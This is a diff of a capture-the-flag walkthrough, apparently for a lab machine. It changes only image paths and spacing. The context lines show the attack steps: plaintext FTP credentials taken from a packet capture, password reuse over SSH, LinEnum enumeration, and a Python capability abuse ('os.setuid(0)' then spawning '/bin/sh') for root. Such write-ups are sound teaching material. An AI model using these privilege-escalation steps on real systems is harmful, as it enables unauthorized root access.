@@ -35,7 +35,7 @@ After running a Security Snapshot, the browser redirects to:
 ```
 
 **Answer:** `data`
-![Enumeration](/Assests/Enum.png)
+![Enumeration](Assests/Enum.png)
 
 ---
 
@@ -70,7 +70,7 @@ https://www.wireshark.org/
 Inside the PCAP, credentials were visible in plaintext.
 
 **Answer:** `FTP`
-![FTP](/Assests/Ftp.jpg)
+![FTP](Assests/Ftp.jpg)
 ---
 
 ### Task 6 — Password 
@@ -79,7 +79,7 @@ Nathan’s FTP password also works on:
 
 **Answer:** `ssh`
 
-![Wireshark](/Assests/Wireshark.jpg)
+![Wireshark](Assests/Wireshark.jpg)
 
 ---
 
@@ -90,14 +90,15 @@ Login using SSH:
 ```bash
 ssh nathan@<ip>
 ```
-![SSH Access](/Assests/Ssh.jpg)
+![SSH Access](Assests/Ssh.jpg)
 
 ### Task 7 — User flag
 
 ```bash
 cat user.txt
 ```
-![User Flag](/Assests/Flag1.jpg)
+![User Flag](Assests/Flag1.jpg)
+
 ---
 
 # Privilege Escalation
@@ -115,7 +116,7 @@ chmod +x LinEnum.sh
 ```
 
 Enumeration reveals a binary with special capabilities.
-![LinEnum Script](/Assests/Linenum.jpg)
+![LinEnum Script](Assests/Linenum.jpg)
 
 ---
 
@@ -124,7 +125,10 @@ Enumeration reveals a binary with special capabilities.
 ```
 /usr/bin/python3.8
 ```
-![LinEnum Result](/Assests/Linenum result.jpg)
+
+
+![LinEnum Result](Assests/Linenum result.jpg)
+
 
 ---
 
@@ -141,7 +145,8 @@ import os
 os.setuid(0)
 os.system('/bin/sh')
 ```
-![Root Flag](/Assests/Root.jpg)
+![Root Flag](Assests/Root.jpg)
+
 ---
 
 ### Task 9 — Root flag
